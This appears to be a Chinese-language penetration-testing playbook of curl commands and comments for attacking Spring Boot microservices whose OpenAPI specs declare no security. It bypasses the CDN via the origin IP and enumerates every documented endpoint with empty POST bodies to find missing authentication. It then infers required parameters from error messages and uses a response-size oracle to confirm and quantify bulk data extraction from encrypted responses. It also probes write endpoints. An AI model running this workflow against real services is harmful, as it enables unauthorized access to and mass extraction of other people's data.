# 适用：Spring Boot + OpenAPI 暴露且 securityScheme 为空的微服务；响应体被应用层加密时无法直接读明文
# 三个阶段：① 空 body 判鉴权 ② 参数阶梯反推导必填字段 ③ size oracle 证明数据真实并量化

## 阶段 0：通道基线（判断反代前缀是否需要改写）
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "https://TARGET/dcserv/api/health"
curl --noproxy '*' -s -o /dev/null -w '%{http_code} %{size_download}\n' "http://ORIGIN_IP/api/health"
curl --noproxy '*' -s -o /dev/null -w '%{http_code} %{size_download}\n' "http://ORIGIN_IP/dcserv/api/health"
# 若带前缀返回 {"code":1004,"msg":"The static resource does not exist:dcserv/..."} ⇒ 前缀是 CDN rewrite，直连要去掉

## 阶段 1：空 body 鉴权判别（关键：不是只有 200 才算未授权）
for p in $(jq -r '.paths|keys[]' api-docs.json); do
  curl --noproxy '*' -s -m 20 -o /tmp/b -w "%{http_code} %{size_download} $p\n" \
    -X POST "http://ORIGIN_IP$p" -H 'Content-Type: application/json' --data '{}'
  sleep 1
done
# 401/403 → 有鉴权，跳过
# 400 / 业务错误码（如 {"code":1003,"msg":"conf must not be null"}）→ 鉴权层已被穿过
# 200 + 大 body → 直接拿到数据

## 阶段 2：明文错误反推导必填参数（找不过加密 advice 的控制器）
# 逐个加参数看错误文案推进：channelCode不能为空 → endTime不能为空 → 事件不能为空 → 200
# 这类控制器（导出/上报/查询）通常不过统一响应加密，是唯一能看到服务端行为的地方

## 阶段 3：size oracle（响应被加密、读不到明文时）
BASE=$(curl -s -o /dev/null -w '%{size_download}' -X POST "$U" -H 'Content-Type: application/json' --data '{}')
NEG=$(curl -s -o /dev/null -w '%{size_download}' -X POST "$U" -H 'Content-Type: application/json' --data '{"key":"ZZZ_NOT_EXIST"}')
POS=$(curl -s -o /dev/null -w '%{size_download}' -X POST "$U" -H 'Content-Type: application/json' --data "$REAL_BODY")
# POS >> BASE ≈ NEG ⇒ 参数被真实消费，命中了数据
# 再把分页开到上限（pageSize=200）测单请求最大体量，量化"可批量拉取"
# 注意：同一请求两次密文不同（随机 IV），所以要用"体量"而不是"内容相同"做判据

## 阶段 4：写接口只判定不执行
curl -s -X POST "$W/api/detectionConf/update?conf=notjson"     # → 1002 已进入解析层
curl -s -X POST "$W/api/eventTracking/report.json" -d '{}'     # → {"code":0,"msg":"success"}
# 到此定性即可，绝不构造合法写体